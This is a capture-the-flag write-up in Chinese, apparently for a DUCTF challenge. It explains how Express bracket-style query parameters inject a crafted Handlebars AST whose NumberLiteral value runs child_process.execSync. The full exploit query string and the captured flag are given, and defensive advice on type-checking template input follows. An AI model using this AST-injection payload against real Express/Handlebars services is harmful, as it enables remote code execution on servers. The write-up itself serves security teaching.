# Request Handling

## 题目简述

服务使用 Express 4 和 Handlebars，根路由将 `req.query.x` 直接交给 `Handlebars.compile()`：

```javascript
app.get('/', (req, res) => {
    res.send(Handlebars.compile(req.query.x)({}));
});
```

题面声称修复了 Handlebars SSTI，但没有约束 query 参数的结构。Express 的 query 解析器会把 `x[type]`、`x[body][0][...]` 解析成嵌套对象；Handlebars 又会把带 `type: 'Program'` 的对象当成 AST，而非普通模板字符串。攻击者因此能直接提交恶意 AST 节点，让编译器把原本应为数字字面量的 `value` 作为生成 JavaScript 的表达式写入模板函数。

## 解题过程

### 构造 AST 注入

将 `x` 声明为 Handlebars `Program`，其第一个 body 节点为 `MustacheStatement`。官方解题脚本的参数如下；它们应作为同一个 GET 请求的 query string 发送：

```text
x[type]=Program
x[body][0][type]=MustacheStatement
x[body][0][path]=0
x[body][0][loc][start]=0
x[body][0][loc][end]=0
x[body][0][params][0][type]=NumberLiteral
x[body][0][params][0][value]=function () {throw new Error(process.mainModule.require('child_process').execSync('/getflag').toString())}()
```

`NumberLiteral.value` 正常应是数字；这里被赋为 JavaScript 表达式。编译后的模板执行该表达式，调用 Node 的 `child_process` 执行只读 flag 程序。把输出放进 `Error` 是为了让 Express 的错误响应携带命令输出，避免需要可见的模板渲染位置。

### 验证

请求返回的错误内容中包含 `/getflag` 输出：

```text
DUCTF{35116296c07966e5f645dac55a0fe81c}
```

这证明利用点是“对象被接受为 AST”而不是常规 `{{...}}` 模板语法绕过。

## 方法总结

- 核心技巧：利用 bracket query 参数形成的对象注入 Handlebars AST，并把不可信值送进代码生成阶段。
- 识别信号：模板编译 API 接受的输入来自 `req.query`、`req.body` 等可产生对象的解析器，而程序只假设它是字符串时，应确认库是否接受 AST。
- 复用要点：先做严格类型检查（仅接收字符串），再把输入视为模板；永远不要接受客户端提供的 AST 或让客户端影响编译器节点字段。
